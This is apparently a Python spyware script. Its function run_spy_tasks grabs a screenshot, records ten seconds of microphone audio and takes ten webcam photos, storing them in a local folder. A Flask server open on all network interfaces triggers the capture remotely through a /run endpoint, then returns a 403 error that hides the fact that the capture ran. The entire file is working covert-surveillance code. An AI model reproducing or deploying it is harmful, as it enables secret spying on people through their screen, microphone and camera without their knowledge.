import os
import time
import sounddevice as sd
import numpy as np
from PIL import ImageGrab
from scipy.io.wavfile import write
import cv2
import traceback
from flask import Flask, jsonify, abort


def run_spy_tasks():
    timestamp = time.strftime('%Y%m%d_%H%M%S')
    base_dir = os.path.dirname(os.path.abspath(__file__))
    captures_dir = os.path.join(base_dir, "captures")
    os.makedirs(captures_dir, exist_ok=True)
    run_dir = os.path.join(captures_dir, f"spyapp_{timestamp}")
    os.makedirs(run_dir, exist_ok=True)
    screenshot_path = os.path.join(run_dir, f"screen_{timestamp}.png")
    mic_path = os.path.join(run_dir, f"mic_{timestamp}.wav")
    duration = 10  # seconds
    results = {"run_dir": run_dir, "screenshot": None, "mic": None, "webcam": []}
    try:
        # Screenshot
        img = ImageGrab.grab()
        img.save(screenshot_path)
        print(f"[+] Screenshot saved: {screenshot_path}")
        results["screenshot"] = screenshot_path
    except Exception as e:
        print(f"[!] Screenshot failed: {e}")
        traceback.print_exc()
        results["screenshot_error"] = str(e)

    try:
        # Mic Recording
        print(f"[+] Recording mic for {duration} seconds...")
        fs = 44100
        recording = sd.rec(int(duration * fs), samplerate=fs, channels=1, dtype='int16')
        # Webcam capture: take 1 picture per second for 10 seconds
        print("[+] Capturing 1 webcam image per second for 10 seconds...")
        cap = cv2.VideoCapture(0)
        if not cap.isOpened():
            raise Exception("Webcam not accessible")
        for i in range(duration):
            ret, frame = cap.read()
            img_path = os.path.join(run_dir, f"webcam_{timestamp}_{i+1:02d}.png")
            if ret:
                cv2.imwrite(img_path, frame)
                print(f"[+] Webcam image saved: {img_path}")
                results["webcam"].append(img_path)
            else:
                print(f"[!] Failed to capture webcam image at second {i+1}.")
        
            time.sleep(1)
        cap.release()
        sd.wait()
        write(mic_path, fs, recording)
        print(f"[+] Mic recording saved: {mic_path}")
        results["mic"] = mic_path
    except Exception as e:
        print(f"[!] Mic/webcam task failed: {e}")
        traceback.print_exc()
        results["mic_webcam_error"] = str(e)
    return results

app = Flask(__name__)

@app.route("/run", methods=["GET"])
def run_endpoint():
    """Run spy tasks on GET request."""
    run_spy_tasks()
    # Instead of returning output, send a 403 Forbidden status
    abort(403, description="Access to results is forbidden.")

if __name__ == "__main__":
    print("[i] Starting Flask server on http://localhost:4044 ...")
    app.run(host="0.0.0.0", port=4044)
